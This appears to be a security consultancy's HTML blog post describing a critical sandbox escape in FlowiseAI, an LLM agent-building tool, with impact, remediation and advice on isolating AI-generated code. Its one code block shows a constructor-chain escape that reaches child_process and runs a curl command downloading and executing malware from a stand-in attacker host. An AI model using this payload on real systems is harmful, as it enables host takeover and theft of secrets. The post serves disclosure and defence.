@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHSA-x58f-9m57: Sandbox Escape in FlowiseAI — Aditya Security Labs</title>
+    <meta name="description" content="GHSA-x58f-9m57. CRITICAL severity. Arbitrary code execution via complete sandbox escape in the LLM orchestration layer of FlowiseAI.">
+    <link rel="icon" href="/favicon.png" />
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --bg: #080808; --bg-raised: #0f0f0f; --text-main: #f0ede8; --text-muted: #8a8a88;
+            --accent: #c8b89a; --border: #222220; --font-mono: 'IBM Plex Mono', monospace;
+            --font-sans: 'IBM Plex Sans', sans-serif; --font-serif: 'EB Garamond', serif; --red: #ef4444;
+        }
+        body { background: var(--bg); color: var(--text-main); font-family: var(--font-sans); -webkit-font-smoothing: antialiased; }
+        nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; padding: 0 2rem; height: 64px; display: flex; align-items: center; background: rgba(8,8,8,0.92); border-bottom: 1px solid var(--border); backdrop-filter: blur(16px); }
+        .nav-logo { font-family: var(--font-sans); font-size: 0.75rem; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-main); text-decoration: none; }
+        .blog-container { max-width: 720px; margin: 0 auto; padding: 15vh 2rem 10vh; }
+        .back-link { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); text-decoration: none; text-transform: uppercase; letter-spacing: 0.1em; display: block; margin-bottom: 4rem; transition: color 150ms; }
+        .back-link:hover { color: var(--accent); }
+        .blog-meta { font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 3rem; display: flex; flex-wrap: wrap; gap: 0.75rem; align-items: center; }
+        .cve-badge { display: inline-block; font-family: var(--font-mono); font-size: 0.75rem; background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); color: var(--red); padding: 0.3rem 0.8rem; border-radius: 3px; }
+        .badge-red { color: #f87171; border-color: rgba(248,113,113,0.3); background: rgba(248,113,113,0.1); }
+        .blog-title { font-family: var(--font-serif); font-size: clamp(2rem, 5vw, 3.5rem); line-height: 1.2; margin-bottom: 2rem; }
+        .blog-body { font-family: var(--font-sans); font-size: 1.05rem; line-height: 1.85; color: var(--text-muted); }
+        .blog-body p { margin-bottom: 1.8rem; }
+        .blog-body h2 { font-family: var(--font-sans); font-size: 1rem; font-weight: 600; color: var(--text-main); margin: 3rem 0 1rem; text-transform: uppercase; letter-spacing: 0.08em; }
+        .blog-body code { font-family: var(--font-mono); font-size: 0.88rem; background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 0.15rem 0.45rem; border-radius: 3px; color: var(--accent); }
+        .blog-body pre { background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 4px; padding: 2rem; overflow-x: auto; margin: 2rem 0; }
+        .blog-body pre code { background: none; border: none; padding: 0; font-size: 0.84rem; color: #9fa8b0; }
+        .blog-body strong { color: var(--text-main); font-weight: 500; }
+        .action-box { border: 1px solid var(--accent); padding: 2rem; margin: 3rem 0; }
+        .action-box h3 { font-family: var(--font-sans); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); margin-bottom: 1rem; }
+        .sig { font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent); border-top: 1px solid var(--border); padding-top: 2rem; margin-top: 3rem; }
+        .sig a { color: var(--accent); }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="/" class="nav-logo">Aditya Security Labs</a>
+    </nav>
+
+    <div class="blog-container">
+        <a href="/" class="back-link">← Back to home</a>
+
+        <div class="blog-meta">
+            <span class="cve-badge">GHSA-x58f-9m57</span>
+            <span class="cve-badge badge-red">CRITICAL Severity</span>
+            Siva Aditya Panuganti
+        </div>
+
+        <h1 class="blog-title">Sandbox Escape in FlowiseAI</h1>
+
+        <div class="blog-body">
+            <p>FlowiseAI is a popular open-source no-code UI for building customized LLM workflows and agents. It relies on a sandboxed JavaScript execution environment (using the <code>vm2</code> module or similar isolation mechanisms) to safely run user-provided or LLM-generated code. This vulnerability (GHSA-x58f-9m57) completely broke that isolation, allowing for arbitrary code execution (ACE) on the host server.</p>
+
+            <h2>The Vulnerability</h2>
+            <p>Sandbox escapes in Node.js are notoriously tricky to prevent. When Flowise allowed users to define custom functions or when LLMs generated tool-use code that was executed dynamically, the sandboxing layer was supposed to restrict access to core Node.js modules like <code>child_process</code> and <code>fs</code>.</p>
+
+            <p>However, the execution context was not fully isolated. By leveraging prototype pollution or manipulating the <code>this</code> context within an asynchronously executed function, an attacker could traverse up the prototype chain to access the main Node.js process context. Once the global context was accessed, requiring built-in modules became trivial.</p>
+
+<pre><code>// Example of a typical escape payload pattern
+const process = this.constructor.constructor('return process')();
+const require = process.mainModule.require;
+const execSync = require('child_process').execSync;
+execSync('curl -O http://attacker.com/malware && chmod +x malware && ./malware');
+</code></pre>
+
+            <h2>Impact</h2>
+            <p>A successful exploit allowed an unauthenticated attacker (if the Flowise instance was publicly exposed without authorization) or an authenticated low-privileged user to execute arbitrary system commands with the privileges of the Node.js process running Flowise. This meant complete host takeover, access to sensitive environment variables (like API keys), and the ability to pivot into the internal network.</p>
+
+            <h2>Remediation</h2>
+            <p>The Flowise team responded quickly. The patch involved migrating away from deprecated or vulnerable sandboxing libraries, hardening the execution context by freezing prototypes (e.g., <code>Object.freeze</code>), and stripping the <code>constructor</code> property from objects passed into the sandbox environment to prevent scope traversal.</p>
+
+            <div class="action-box">
+                <h3>Securing AI Agents that Run Code</h3>
+                <p>If you are building LLM applications that execute dynamically generated code:</p>
+                <ul>
+                    <li style="margin-bottom: 0.5rem;">Never rely solely on JavaScript-level sandboxing (like `vm` or `vm2`) for untrusted code execution. They are consistently bypassed.</li>
+                    <li style="margin-bottom: 0.5rem;">Use strong isolation per execution context: Docker containers with dropped capabilities, microVMs (like Firecracker), or WebAssembly runtimes (Wasmtime).</li>
+                    <li style="margin-bottom: 0.5rem;">Drop network access from the execution container unless explicitly required.</li>
+                </ul>
+            </div>
+
+            <p class="sig">
+                Siva Aditya Panuganti · Founder, Aditya Security Labs<br>
+                <a href="/#contact">Book a security review →</a>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
